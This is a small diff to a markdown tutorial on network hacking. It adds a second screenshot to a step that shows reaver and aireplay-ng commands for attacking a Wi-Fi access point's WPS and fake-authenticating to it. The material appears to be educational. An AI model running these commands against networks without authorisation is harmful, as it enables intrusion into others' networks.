@@ -45,10 +45,12 @@ To learn how malicious hackers hack a wired or wireless network and steal inform
 
 6. Associate with the network
 - reaver --bssid **AP bssid** --channel **AP channel** --interface wlan0 -vvv --no-associate
-
 - aireplay-ng --fakeauth 30 -a **AP bssid** -h **device mac** wlan0
   ### Screenshot
 ![Reaver](../screenshots/reaver.png)
+### Screenshot2
+![Reaver2](../screenshots/reaver2.png)
+
 
 
 
